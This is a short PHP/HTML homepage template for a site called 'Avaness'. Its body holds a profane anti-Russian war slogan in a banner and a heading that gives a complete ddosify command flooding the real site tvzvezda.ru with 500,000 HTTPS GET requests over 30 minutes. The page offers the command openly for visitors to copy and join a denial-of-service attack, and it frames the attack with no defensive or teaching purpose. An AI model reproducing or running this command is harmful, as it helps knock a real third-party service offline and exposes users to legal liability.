<?php 
	require_once 'inc/db.php';
?>

<!DOCTYPE html>
<html lang="en">
	<head>
		<?php require 'inc/head.php'; ?>
		<link rel="stylesheet" href="css/main.css">
		<title>Home | Avaness</title>
	</head>
	<body>

		<?php 
			require 'inc/nav.php';
			require 'inc/switch.php';
		?>

		<div class="container">
			<div class="row">

				<div class="chip center">
					Русский военный корабль, иди нахуй!
					<i class="close material-icons">close</i>
				</div>
			</div>
		</div><br>

		<div class="container">
			<div class="row">
				<h5 class="center">DdoS: ddosify -t https://tvzvezda.ru -n 500000 -d 1800 -p HTTPS -m GET -l linear</h4>
			</div>
		</div>

		<?php 
			require 'inc/footer.php';
			require 'inc/script.php';
		?>

	</body>
</html>